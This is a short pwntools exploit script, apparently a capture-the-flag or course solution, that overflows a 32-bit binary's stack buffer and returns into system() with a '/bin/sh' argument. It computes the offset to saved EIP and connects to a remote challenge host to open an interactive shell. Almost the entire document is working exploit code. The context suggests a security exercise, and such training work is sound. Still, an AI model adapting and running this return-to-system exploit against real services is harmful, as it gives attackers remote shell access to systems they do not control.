from pwn import *

elf = ELF('./bin')

buffer = 0xffffcda0

eip = 0xffffce2c
offset = eip - buffer

systemAddr = elf.symbols['system']

bash = next(elf.search(b'/bin/sh')) #next is needed because elf-search returns a generated aka an iterator object of all the addresses of the string /bin/sh


# pwndbg> search "/bin/sh"
# Searching for byte: b'/bin/sh'
# bin             0x80bd420 das  /* '/bin/sh' */
# pwndbg> x/s 0x80bd420
# 0x80bd420:      "/bin/sh"


print(hex(bash))
print(offset)
payload = b"A"*offset + p32(systemAddr) + b"bbbb" + p32(bash) # A's to fill the buffer, system address, return address , /bin/sh address argument to system

# P = process('./bin')
P = remote('mustard.stt.rnl.tecnico.ulisboa.pt', 10101)
P.sendline(payload)
P.interactive()